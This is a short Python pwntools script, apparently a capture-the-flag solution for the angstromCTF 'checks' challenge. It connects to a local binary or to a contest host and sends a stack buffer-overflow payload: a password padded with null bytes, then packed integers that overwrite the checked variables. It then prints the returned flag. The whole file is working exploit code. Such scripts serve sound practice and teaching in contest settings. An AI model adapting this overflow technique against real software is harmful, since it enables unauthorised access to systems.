from pwn import *

LOCAL = True
HOST, PORT = 'shell.actf.co', 21303
FILE = '/home/ubuntu/anstrongCTF/checks'

context.arch = 'amd64'

if LOCAL:
	r = process(FILE)
else:
	r = remote(HOST, PORT)

payload = b'password123'.ljust(0x4c, b'\x00') 
payload += p32(0x11)
payload += p32(0x3D)
payload += p32(0xF5)
payload += p32(0x37)
payload += p32(0x32)
r.sendlineafter('Enter the secret word: ', payload)
r.recvuntil('in order...\n')
log.success(r.recvline())
